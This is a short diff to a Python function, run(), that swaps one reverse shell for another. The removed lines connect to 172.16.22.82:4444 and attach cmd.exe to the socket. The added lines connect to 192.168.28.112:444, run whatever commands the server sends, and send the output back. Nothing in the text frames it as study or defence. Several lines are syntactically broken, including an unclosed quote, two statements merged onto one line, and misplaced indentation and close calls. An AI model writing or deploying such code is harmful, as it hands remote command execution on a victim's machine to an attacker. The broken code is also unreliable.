@@ -1,6 +1,24 @@
 def run():
-   import socket,subprocess,os;
-   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-   s.connect(('172.16.22.82,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
-   os.dup2(s.fileno(),2);
-   p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);
+   import socket
+   import subprocess SERVER_HOST = "192.168.28.112"
+   SERVER_PORT = 444
+   BUFFER_SIZE = 1024
+# create the socket object
+   s = socket.socket()
+# connect to the server
+   s.connect((SERVER_HOST, SERVER_PORT))
+# receive the greeting message
+   message = s.recv(BUFFER_SIZE).decode()
+   print("Server:", message)
+   while True:
+    # receive the command from the server
+      command = s.recv(BUFFER_SIZE).decode()
+      if command.lower() == "exit":
+        # if the command is exit, just break out of the loop
+      break
+    # execute the command and retrieve the results
+      output = subprocess.getoutput(command)
+    # send the results back to the server
+      s.send(output.encode())
+# close client connection
+      s.close()
